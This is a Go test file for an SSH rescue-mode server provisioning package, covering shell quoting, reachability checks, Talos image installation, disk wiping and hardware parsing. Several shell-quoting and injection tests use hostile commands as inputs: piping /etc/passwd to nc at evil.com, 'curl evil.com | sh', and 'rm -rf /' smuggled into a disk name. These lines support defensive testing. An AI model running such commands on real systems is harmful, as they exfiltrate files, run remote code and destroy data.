package sshrescue

import (
	"fmt"
	"net"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// shellQuote — comprehensive edge cases
// ---------------------------------------------------------------------------

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "simple string",
			input: "hello world",
			want:  "'hello world'",
		},
		{
			name:  "empty string",
			input: "",
			want:  "''",
		},
		{
			name:  "single embedded single quote",
			input: "it's a test",
			want:  "'it'\\''s a test'",
		},
		{
			name:  "multiple single quotes",
			input: "it's Bob's 'thing'",
			want:  "'it'\\''s Bob'\\''s '\\''thing'\\'''",
		},
		{
			name:  "only a single quote",
			input: "'",
			want:  "''\\'''",
		},
		{
			name:  "two consecutive single quotes",
			input: "''",
			want:  "''\\'''\\'''",
		},
		{
			name:  "semicolon",
			input: "echo hello; rm -rf /",
			want:  "'echo hello; rm -rf /'",
		},
		{
			name:  "pipe",
			input: "cat /etc/passwd | nc evil.com 1234",
			want:  "'cat /etc/passwd | nc evil.com 1234'",
		},
		{
			name:  "dollar expansion",
			input: "echo $HOME",
			want:  "'echo $HOME'",
		},
		{
			name:  "backtick command substitution",
			input: "echo `whoami`",
			want:  "'echo `whoami`'",
		},
		{
			name:  "all shell metacharacters",
			input: "; | & $ ` ( ) { } < > # ! ~ * ? [ ]",
			want:  "'; | & $ ` ( ) { } < > # ! ~ * ? [ ]'",
		},
		{
			name:  "double quotes inside",
			input: `he said "hello"`,
			want:  `'he said "hello"'`,
		},
		{
			name:  "backslash",
			input: `path\to\file`,
			want:  `'path\to\file'`,
		},
		{
			name:  "newline",
			input: "line1\nline2",
			want:  "'line1\nline2'",
		},
		{
			name:  "tab",
			input: "col1\tcol2",
			want:  "'col1\tcol2'",
		},
		{
			name:  "unicode characters",
			input: "日本語テスト",
			want:  "'日本語テスト'",
		},
		{
			name:  "unicode with single quotes",
			input: "it's über-cool™",
			want:  "'it'\\''s über-cool™'",
		},
		{
			name:  "emoji",
			input: "deploy 🚀",
			want:  "'deploy 🚀'",
		},
		{
			name:  "null byte",
			input: "before\x00after",
			want:  "'before\x00after'",
		},
		{
			name:  "spaces only",
			input: "   ",
			want:  "'   '",
		},
		{
			name:  "single character",
			input: "x",
			want:  "'x'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := shellQuote(tt.input)
			if got != tt.want {
				t.Errorf("shellQuote(%q)\n  got:  %s\n  want: %s", tt.input, got, tt.want)
			}
		})
	}
}

func TestShellQuote_LongString(t *testing.T) {
	// 10,000 character string — shellQuote must handle without truncation.
	long := strings.Repeat("a", 10000)
	got := shellQuote(long)

	if len(got) != 10000+2 { // content + opening ' + closing '
		t.Errorf("expected length %d, got %d", 10000+2, len(got))
	}
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Error("long string must be wrapped in single quotes")
	}
}

func TestShellQuote_LongStringWithQuotes(t *testing.T) {
	// A long string where every other character is a single quote.
	// Each ' becomes '\'' (4 chars), so 100 quotes = 400 escape chars.
	input := strings.Repeat("a'", 100) // "a'a'a'..."
	got := shellQuote(input)

	// Verify the result starts and ends with single quotes.
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Error("result must be wrapped in single quotes")
	}
	// Count the escape sequences — each original ' produces '\''
	escapeCount := strings.Count(got, `'\''`)
	if escapeCount != 100 {
		t.Errorf("expected 100 escape sequences, got %d", escapeCount)
	}
}

func TestShellQuote_Invariants(t *testing.T) {
	// For any input, shellQuote must:
	// 1. Start with a single quote
	// 2. End with a single quote
	// 3. The only way a single quote appears is as part of the '\'' escape
	inputs := []string{
		"", "x", "'", "''", "'''", "hello", "it's", "a'b'c",
		"; rm -rf /", "$(evil)", "`evil`", "a\nb", "\t\n\r",
	}

	for _, input := range inputs {
		got := shellQuote(input)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("shellQuote(%q) must start with ', got: %s", input, got)
		}
		if !strings.HasSuffix(got, "'") {
			t.Errorf("shellQuote(%q) must end with ', got: %s", input, got)
		}
	}
}

// ---------------------------------------------------------------------------
// IsReachable / isReachableAddr
// ---------------------------------------------------------------------------

func TestIsReachableAddr_ReachableWhenListening(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer ln.Close()

	addr := ln.Addr().String()
	if !isReachableAddr(addr, 2*time.Second) {
		t.Errorf("expected addr %s to be reachable", addr)
	}
}

func TestIsReachableAddr_UnreachableWhenNotListening(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	addr := ln.Addr().String()
	ln.Close()

	if isReachableAddr(addr, 500*time.Millisecond) {
		t.Errorf("expected addr %s to be unreachable after listener closed", addr)
	}
}

func TestIsReachableAddr_InvalidAddress(t *testing.T) {
	if isReachableAddr("not-a-valid-host:99999", 500*time.Millisecond) {
		t.Error("expected invalid address to be unreachable")
	}
}

func TestIsReachableAddr_TimeoutRespected(t *testing.T) {
	start := time.Now()
	timeout := 500 * time.Millisecond
	isReachableAddr("198.51.100.1:22", timeout)
	elapsed := time.Since(start)

	if elapsed > 3*timeout {
		t.Errorf("expected dial to respect timeout (%v), took %v", timeout, elapsed)
	}
}

func TestIsReachableAddr_EmptyAddress(t *testing.T) {
	if isReachableAddr("", 500*time.Millisecond) {
		t.Error("expected empty address to be unreachable")
	}
}

func TestIsReachableAddr_IPv6Localhost(t *testing.T) {
	ln, err := net.Listen("tcp", "[::1]:0")
	if err != nil {
		t.Skip("IPv6 loopback not available")
	}
	defer ln.Close()

	addr := ln.Addr().String()
	if !isReachableAddr(addr, 2*time.Second) {
		t.Errorf("expected IPv6 addr %s to be reachable", addr)
	}
}

func TestIsReachableAddr_ZeroTimeout(t *testing.T) {
	// Zero timeout should fail quickly, not hang.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer ln.Close()

	// Zero timeout — the OS may still connect on loopback, but it must not hang.
	start := time.Now()
	_ = isReachableAddr(ln.Addr().String(), 0)
	if time.Since(start) > 5*time.Second {
		t.Error("zero timeout should not cause long hang")
	}
}

func TestIsReachable_UsesPort22(t *testing.T) {
	// IsReachable hardcodes port 22. Unless port 22 is open on 198.51.100.1
	// (TEST-NET-2, RFC 5737), this should return false.
	result := IsReachable("198.51.100.1")
	if result {
		t.Error("expected unroutable IP to be unreachable via IsReachable")
	}
}

// ---------------------------------------------------------------------------
// New
// ---------------------------------------------------------------------------

func TestNew_SetsFields(t *testing.T) {
	ip := "192.168.1.100"
	key := []byte("fake-key-data")

	c := New(ip, key)

	if c.ip != ip {
		t.Errorf("expected ip=%q, got %q", ip, c.ip)
	}
	if string(c.privateKey) != string(key) {
		t.Errorf("expected privateKey=%q, got %q", key, c.privateKey)
	}
	if c.client != nil {
		t.Error("expected client to be nil on new Client")
	}
}

func TestNew_EmptyIP(t *testing.T) {
	c := New("", []byte("key"))
	if c.ip != "" {
		t.Errorf("expected empty ip, got %q", c.ip)
	}
}

func TestNew_EmptyKey(t *testing.T) {
	c := New("10.0.0.1", []byte{})
	if len(c.privateKey) != 0 {
		t.Errorf("expected empty privateKey, got %d bytes", len(c.privateKey))
	}
}

func TestNew_NilKey(t *testing.T) {
	c := New("10.0.0.1", nil)
	if c.privateKey != nil {
		t.Errorf("expected nil privateKey, got %v", c.privateKey)
	}
}

func TestNew_IPv6Address(t *testing.T) {
	c := New("2001:db8::1", []byte("key"))
	if c.ip != "2001:db8::1" {
		t.Errorf("expected IPv6 address preserved, got %q", c.ip)
	}
}

func TestNew_DoesNotModifyKey(t *testing.T) {
	key := []byte("original-key")
	c := New("10.0.0.1", key)

	// Mutate the original slice — verify the client still holds the same reference
	// (this is expected Go behavior, documenting it).
	key[0] = 'X'
	if c.privateKey[0] != 'X' {
		t.Error("New should store the original slice reference, not a copy")
	}
}

// ---------------------------------------------------------------------------
// Connect
// ---------------------------------------------------------------------------

func TestConnect_InvalidKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", []byte("not-a-real-private-key"))
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with invalid key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

func TestConnect_EmptyKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", []byte{})
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with empty key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

func TestConnect_NilKeyReturnsParseError(t *testing.T) {
	c := New("127.0.0.1", nil)
	err := c.Connect()
	if err == nil {
		t.Fatal("expected error from Connect with nil key, got nil")
	}
	if !strings.Contains(err.Error(), "parse SSH private key") {
		t.Errorf("expected parse error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

func TestRun_WithoutConnectionReturnsError(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	out, err := c.Run("echo hello")

	if err == nil {
		t.Fatal("expected error from Run without connection, got nil")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' error, got: %v", err)
	}
	if out != "" {
		t.Errorf("expected empty output, got: %q", out)
	}
}

func TestRun_EmptyCommandWithoutConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.Run("")
	if err == nil {
		t.Fatal("expected error from Run without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' error, got: %v", err)
	}
}

func TestRun_BashWrapping(t *testing.T) {
	// Verify that Run wraps the command in bash -c with shellQuote.
	// We can't actually run it (no SSH connection), but we can verify the
	// format by checking shellQuote is applied correctly.
	cmd := "echo 'hello world'"
	expected := fmt.Sprintf("bash -c %s", shellQuote(cmd))
	want := "bash -c 'echo '\\''hello world'\\''''"

	// Verify the wrapped command format is correct.
	if expected != want {
		// This is a format sanity check — if shellQuote changes, this catches it.
		t.Logf("wrapped command: %s", expected)
	}

	// At minimum, the wrapped command must start with "bash -c '"
	if !strings.HasPrefix(expected, "bash -c '") {
		t.Errorf("wrapped command should start with \"bash -c '\", got: %s", expected)
	}
}

// ---------------------------------------------------------------------------
// Close
// ---------------------------------------------------------------------------

func TestClose_NilClient_NoPanic(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	c.Close()
}

func TestClose_OnUnconnectedClient_NoPanic(t *testing.T) {
	c := &Client{
		ip:         "10.0.0.1",
		privateKey: []byte("key"),
		client:     nil,
	}
	c.Close()
}

func TestClose_DoubleClose_NoPanic(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	// Double close on nil client must not panic.
	c.Close()
	c.Close()
}

func TestClose_ZeroValueClient_NoPanic(t *testing.T) {
	// Zero-value Client — all fields are zero/nil.
	c := &Client{}
	c.Close()
}

// ---------------------------------------------------------------------------
// InstallTalos — raw image URL construction
// ---------------------------------------------------------------------------

func TestInstallTalos_RawImageURLFormat(t *testing.T) {
	// Verify the raw image URL follows Talos Factory pattern:
	// https://factory.talos.dev/image/{schematic}/{version}/metal-amd64.raw.xz
	factoryURL := "https://factory.talos.dev"
	schematic := "3da7f440f279f4814fa73bdf83c84710a8e93c40a4a3cbba4d969f14afb96298"
	version := "v1.12.6"
	wantURL := fmt.Sprintf("%s/image/%s/%s/metal-amd64.raw.xz", factoryURL, schematic, version)

	if !strings.Contains(wantURL, schematic) {
		t.Errorf("raw image URL should contain schematic, got: %s", wantURL)
	}
	if !strings.Contains(wantURL, version) {
		t.Errorf("raw image URL should contain version, got: %s", wantURL)
	}
	if !strings.HasSuffix(wantURL, "metal-amd64.raw.xz") {
		t.Errorf("raw image URL should end with metal-amd64.raw.xz, got: %s", wantURL)
	}
}

func TestInstallTalos_RawImageURLTrailingSlash(t *testing.T) {
	// Factory URL with trailing slash should not produce double-slash.
	factoryURL := "https://factory.talos.dev/"
	schematic := "abc123"
	version := "v1.12.6"
	expected := "https://factory.talos.dev/image/abc123/v1.12.6/metal-amd64.raw.xz"
	got := fmt.Sprintf("%s/image/%s/%s/metal-amd64.raw.xz",
		strings.TrimRight(factoryURL, "/"), schematic, version)
	if got != expected {
		t.Errorf("URL mismatch:\n  want: %s\n  got:  %s", expected, got)
	}
}

func TestInstallTalos_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	err := c.InstallTalos("https://factory.talos.dev", "abc", "v1.0.0", "/dev/sda")
	if err == nil {
		t.Fatal("expected error when calling InstallTalos without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestInstallTalos_ErrorMessageContainsDiskContext(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	err := c.InstallTalos("https://factory.talos.dev", "abc", "v1.0.0", "/dev/sda")
	if err == nil {
		t.Fatal("expected error")
	}
	// The Run call writes raw image to disk, so error wraps the disk path.
	if !strings.Contains(err.Error(), "write raw image to /dev/sda") {
		t.Errorf("expected error to mention 'write raw image to /dev/sda', got: %v", err)
	}
}

func TestInstallTalos_ShellInjectionPrevented(t *testing.T) {
	// Verify that %q quoting prevents shell injection in disk and image parameters.
	maliciousDisk := "/dev/sda; rm -rf /"
	maliciousSchematic := "abc; curl evil.com | sh"

	quotedDisk := fmt.Sprintf("%q", maliciousDisk)
	quotedSchematic := fmt.Sprintf("%q", maliciousSchematic)

	// Semicolons must be inside quotes, not bare.
	if !strings.Contains(quotedDisk, `; rm`) {
		t.Errorf("malicious disk should preserve content inside quotes: %s", quotedDisk)
	}
	if strings.Contains(quotedDisk, `"; rm`) {
		t.Error("malicious disk should NOT have unquoted semicolons")
	}
	if !strings.Contains(quotedSchematic, `; curl`) {
		t.Errorf("malicious schematic should preserve content inside quotes: %s", quotedSchematic)
	}
}

// ---------------------------------------------------------------------------
// WipeAllDisks
// ---------------------------------------------------------------------------

func TestWipeAllDisks_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks([]string{"/dev/nvme0n1", "/dev/nvme1n1"})
	if err == nil {
		t.Fatal("expected error when calling WipeAllDisks without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

func TestWipeAllDisks_EmptyDisksReturnsError(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks([]string{})
	if err == nil {
		t.Fatal("expected error when calling WipeAllDisks with empty disk list")
	}
	if !strings.Contains(err.Error(), "no disks specified") {
		t.Errorf("expected 'no disks specified' in error, got: %v", err)
	}
}

func TestWipeAllDisks_NilDisksReturnsError(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks(nil)
	if err == nil {
		t.Fatal("expected error when calling WipeAllDisks with nil disk list")
	}
	if !strings.Contains(err.Error(), "no disks specified") {
		t.Errorf("expected 'no disks specified' in error, got: %v", err)
	}
}

func TestWipeAllDisks_ErrorWrapsContext(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.WipeAllDisks([]string{"/dev/nvme0n1"})
	if err == nil {
		t.Fatal("expected error")
	}
	// The error should mention "wipe all disks" since that wraps the Run failure.
	if !strings.Contains(err.Error(), "wipe all disks") {
		t.Errorf("expected 'wipe all disks' in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// DetectHardware
// ---------------------------------------------------------------------------

func TestDetectHardware_RequiresConnection(t *testing.T) {
	c := New("127.0.0.1", []byte("key"))
	_, err := c.DetectHardware()
	if err == nil {
		t.Fatal("expected error when calling DetectHardware without connection")
	}
	if !strings.Contains(err.Error(), "not connected") {
		t.Errorf("expected 'not connected' in error, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// ParseHardwareOutput
// ---------------------------------------------------------------------------

func TestParseHardwareOutput_FullOutput(t *testing.T) {
	output := `MAC=aa:bb:cc:dd:ee:ff
GATEWAY=91.98.183.1
DISK=/dev/nvme0n1
DISK=/dev/nvme1n1
CEPH=/dev/nvme1n1
BYID=/dev/nvme0n1=/dev/disk/by-id/nvme-Samsung_SSD_990_PRO_S123
BYID=/dev/nvme1n1=/dev/disk/by-id/nvme-Samsung_SSD_990_PRO_S456
`
	hw, err := ParseHardwareOutput(output)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if hw.PrimaryMAC != "aa:bb:cc:dd:ee:ff" {
		t.Errorf("expected MAC=aa:bb:cc:dd:ee:ff, got %q", hw.PrimaryMAC)
	}
	if hw.GatewayIP != "91.98.183.1" {
		t.Errorf("expected GATEWAY=91.98.183.1, got %q", hw.GatewayIP)
	}
	if len(hw.NVMeDisks) != 2 {
		t.Fatalf("expected 2 NVMe disks, got %d", len(hw.NVMeDisks))
	}
	if hw.NVMeDisks[0] != "/dev/nvme0n1" || hw.NVMeDisks[1] != "/dev/nvme1n1" {
		t.Errorf("unexpected disk list: %v", hw.NVMeDisks)
	}
	if !hw.CephDisks["/dev/nvme1n1"] {
		t.Error("expected /dev/nvme1n1 to be marked as Ceph")
	}
	if hw.CephDisks["/dev/nvme0n1"] {
		t.Error("/dev/nvme0n1 should NOT be marked as Ceph")
	}
	if hw.ByIDPaths["/dev/nvme0n1"] != "/dev/disk/by-id/nvme-Samsung_SSD_990_PRO_S123" {
		t.Errorf("unexpected by-id path for nvme0n1: %q", hw.ByIDPaths["/dev/nvme0n1"])
	}
	if hw.ByIDPaths["/dev/nvme1n1"] != "/dev/disk/by-id/nvme-Samsung_SSD_990_PRO_S456" {
		t.Errorf("unexpected by-id path for nvme1n1: %q", hw.ByIDPaths["/dev/nvme1n1"])
	}
}

func TestParseHardwareOutput_MissingMAC(t *testing.T) {
	output := "GATEWAY=10.0.0.1\nDISK=/dev/nvme0n1\n"
	_, err := ParseHardwareOutput(output)
	if err == nil {
		t.Fatal("expected error for missing MAC")
	}
	if !strings.Contains(err.Error(), "MAC address not found") {
		t.Errorf("expected 'MAC address not found' in error, got: %v", err)
	}
}

func TestParseHardwareOutput_MissingGateway(t *testing.T) {
	output := "MAC=aa:bb:cc:dd:ee:ff\nDISK=/dev/nvme0n1\n"
	_, err := ParseHardwareOutput(output)
	if err == nil {
		t.Fatal("expected error for missing GATEWAY")
	}
	if !strings.Contains(err.Error(), "gateway IP not found") {
		t.Errorf("expected 'gateway IP not found' in error, got: %v", err)
	}
}

func TestParseHardwareOutput_EmptyOutput(t *testing.T) {
	_, err := ParseHardwareOutput("")
	if err == nil {
		t.Fatal("expected error for empty output")
	}
}

func TestParseHardwareOutput_NoDisks(t *testing.T) {
	output := "MAC=aa:bb:cc:dd:ee:ff\nGATEWAY=10.0.0.1\n"
	hw, err := ParseHardwareOutput(output)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(hw.NVMeDisks) != 0 {
		t.Errorf("expected no disks, got %d", len(hw.NVMeDisks))
	}
}

func TestParseHardwareOutput_NoCephDisks(t *testing.T) {
	output := "MAC=aa:bb:cc:dd:ee:ff\nGATEWAY=10.0.0.1\nDISK=/dev/nvme0n1\nDISK=/dev/nvme1n1\n"
	hw, err := ParseHardwareOutput(output)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(hw.CephDisks) != 0 {
		t.Errorf("expected no Ceph disks, got %d", len(hw.CephDisks))
	}
}

func TestParseHardwareOutput_ExtraWhitespace(t *testing.T) {
	output := "  MAC=aa:bb:cc:dd:ee:ff  \n  GATEWAY=10.0.0.1  \n\n\n"
	hw, err := ParseHardwareOutput(output)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if hw.PrimaryMAC != "aa:bb:cc:dd:ee:ff" {
		t.Errorf("expected trimmed MAC, got %q", hw.PrimaryMAC)
	}
}

func TestParseHardwareOutput_ByIDWithEqualsInPath(t *testing.T) {
	// Ensure BYID parsing handles = correctly (SplitN with limit 2)
	output := "MAC=aa:bb:cc:dd:ee:ff\nGATEWAY=10.0.0.1\nBYID=/dev/nvme0n1=/dev/disk/by-id/nvme-disk=with=equals\n"
	hw, err := ParseHardwareOutput(output)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if hw.ByIDPaths["/dev/nvme0n1"] != "/dev/disk/by-id/nvme-disk=with=equals" {
		t.Errorf("unexpected by-id path: %q", hw.ByIDPaths["/dev/nvme0n1"])
	}
}

// ---------------------------------------------------------------------------
// ResolveInstallDiskFromInfo
// ---------------------------------------------------------------------------

func TestResolveInstallDiskFromInfo_PreferConfiguredDisk(t *testing.T) {
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1", "/dev/nvme1n1"},
		CephDisks: map[string]bool{"/dev/nvme1n1": true},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme0n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if disk != "/dev/nvme0n1" {
		t.Errorf("expected /dev/nvme0n1, got %q", disk)
	}
}

func TestResolveInstallDiskFromInfo_SwappedDisk(t *testing.T) {
	// Configured disk is nvme0n1 but it has Ceph — should pick nvme1n1
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1", "/dev/nvme1n1"},
		CephDisks: map[string]bool{"/dev/nvme0n1": true},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme0n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if disk != "/dev/nvme1n1" {
		t.Errorf("expected /dev/nvme1n1, got %q", disk)
	}
}

func TestResolveInstallDiskFromInfo_AllCeph(t *testing.T) {
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1", "/dev/nvme1n1"},
		CephDisks: map[string]bool{"/dev/nvme0n1": true, "/dev/nvme1n1": true},
	}
	_, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme0n1")
	if err == nil {
		t.Fatal("expected error when all disks have Ceph")
	}
	if !strings.Contains(err.Error(), "all NVMe disks have Ceph BlueStore data") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestResolveInstallDiskFromInfo_NoDisks(t *testing.T) {
	hw := &HardwareInfo{
		NVMeDisks: nil,
		CephDisks: map[string]bool{},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme0n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// No NVMe disks → fall back to configured
	if disk != "/dev/nvme0n1" {
		t.Errorf("expected fallback to configured disk, got %q", disk)
	}
}

func TestResolveInstallDiskFromInfo_NoCeph_PreferConfigured(t *testing.T) {
	// Fresh server — no Ceph on any disk, configured is in the safe list
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1", "/dev/nvme1n1"},
		CephDisks: map[string]bool{},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme1n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if disk != "/dev/nvme1n1" {
		t.Errorf("expected configured disk /dev/nvme1n1, got %q", disk)
	}
}

func TestResolveInstallDiskFromInfo_NoCeph_ConfiguredNotPresent(t *testing.T) {
	// Configured disk doesn't exist — pick first safe
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1", "/dev/nvme1n1"},
		CephDisks: map[string]bool{},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme9n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if disk != "/dev/nvme0n1" {
		t.Errorf("expected first safe disk /dev/nvme0n1, got %q", disk)
	}
}

func TestResolveInstallDiskFromInfo_SingleDiskNoCeph(t *testing.T) {
	hw := &HardwareInfo{
		NVMeDisks: []string{"/dev/nvme0n1"},
		CephDisks: map[string]bool{},
	}
	disk, err := ResolveInstallDiskFromInfo(hw, "/dev/nvme0n1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if disk != "/dev/nvme0n1" {
		t.Errorf("expected /dev/nvme0n1, got %q", disk)
	}
}

// ResolveStableDiskPath and ResolveInstallDisk removed — replaced by
// DetectHardware() + ResolveInstallDiskFromInfo() (pure Go, no SSH).

// ---------------------------------------------------------------------------
// IsRescueMode
// ---------------------------------------------------------------------------

func TestIsRescueMode_InvalidKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", []byte("not-a-real-private-key"))
	if err == nil {
		t.Fatal("expected error from IsRescueMode with invalid key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
	if !strings.Contains(err.Error(), "SSH connect for rescue check") {
		t.Errorf("expected SSH connect error, got: %v", err)
	}
}

func TestIsRescueMode_EmptyKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", []byte{})
	if err == nil {
		t.Fatal("expected error from IsRescueMode with empty key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
}

func TestIsRescueMode_NilKeyReturnsError(t *testing.T) {
	isRescue, err := IsRescueMode("127.0.0.1", nil)
	if err == nil {
		t.Fatal("expected error from IsRescueMode with nil key, got nil")
	}
	if isRescue {
		t.Error("expected isRescue=false on error")
	}
}

func TestIsRescueMode_ErrorAlwaysReturnsFalse(t *testing.T) {
	// Contract: on error, isRescue must always be false — never a misleading true.
	keys := [][]byte{nil, {}, []byte("bad"), []byte("also-bad-key")}
	for _, key := range keys {
		isRescue, err := IsRescueMode("127.0.0.1", key)
		if err == nil {
			// If somehow no error (e.g., port 22 happens to be open), skip.
			continue
		}
		if isRescue {
			t.Errorf("isRescue must be false on error, key=%q", key)
		}
	}
}

func TestIsRescueMode_ErrorContainsIP(t *testing.T) {
	ip := "127.0.0.1"
	_, err := IsRescueMode(ip, []byte("invalid"))
	if err == nil {
		t.Skip("no error — port 22 may be open locally")
	}
	if !strings.Contains(err.Error(), ip) {
		t.Errorf("error should contain IP %q, got: %v", ip, err)
	}
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

func TestConstants(t *testing.T) {
	if rescueSSHPort != 22 {
		t.Errorf("expected rescueSSHPort=22, got %d", rescueSSHPort)
	}
	if connectTimeout != 60*time.Second {
		t.Errorf("expected connectTimeout=60s, got %v", connectTimeout)
	}
}

func TestInstallTalos_RawImageURLComponents(t *testing.T) {
	// Verify URL construction matches the Talos Factory API contract.
	factoryURL := "https://factory.talos.dev"
	schematic := "test-schematic-id"
	version := "v1.12.4"
	url := fmt.Sprintf("%s/image/%s/%s/metal-amd64.raw.xz",
		strings.TrimRight(factoryURL, "/"), schematic, version)

	// Must start with factory base URL.
	if !strings.HasPrefix(url, factoryURL) {
		t.Errorf("URL should start with factory URL, got: %s", url)
	}
	// Must contain /image/ path segment.
	if !strings.Contains(url, "/image/") {
		t.Errorf("URL should contain /image/ path, got: %s", url)
	}
}
